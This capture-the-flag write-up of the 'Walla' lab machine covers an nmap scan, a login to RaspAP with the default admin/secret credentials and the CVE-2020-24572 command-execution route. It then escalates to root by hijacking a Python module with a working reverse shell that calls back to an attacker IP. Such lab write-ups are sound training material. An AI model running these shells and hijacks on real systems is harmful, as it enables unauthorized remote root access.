#### Enumeration

##### Nmap

```
# Nmap 7.91 scan initiated Fri Jul  2 09:04:26 2021 as: nmap -Pn -p- -sC -sV -T4 -oN Walla.nmap 192.168.229.97
Nmap scan report for 192.168.229.97
Host is up (0.21s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36
|_ssl-date: TLS randomness does not represent time
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
8091/tcp  open  http       lighttpd 1.4.53
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: lighttpd/1.4.53
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  2 09:26:35 2021 -- 1 IP address (1 host up) scanned in 1329.58 seconds
```

Connect to http service on 8091 port.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_00h38m46s_001_.png)

Notice the RaspAp that is a wireless router software. Login to the WebUI with the default credential username `admin` and password `secret` successfully.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_01h03m31s_002_.png)

In the about page, we know that the version is `2.5`.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_01h06m13s_003_.png)

There is a remote command execution vulnerability [CVE-2020-24572](https://github.com/gerbsec/CVE-2020-24572-POC) can use to obtain an interactive shell.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_19h04m45s_001_.png)

Get the local.txt.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_19h05m42s_002_.png)

#### Privilege Escalation

Use command `sudo -l` to list available permissions.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_19h22m05s_003_.png)

Notice the `wifi_reset.py` import the `wificontroller.py`. 

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_19h22m39s_004_.png)

We can set up a `wificontroller.py` file, which contains the reverse shell content, to make `wifi_reset.py` call.

```
#!/usr/bin/env python
import os
import sys
try:
        os.system("python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.140\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'")
except:
        print 'ERROR...'
sys.exit(0)
```

After create `wificontroller.py` file in the `/home/walter` folder. Execute the command `sudo /usr/bin/python /home/walter/wifi_reset.py`.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_20h03m18s_005_.png)

Get a shell back with root permisson.

![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Walla/Walla_2021.07.10_20h03m58s_006_.png)
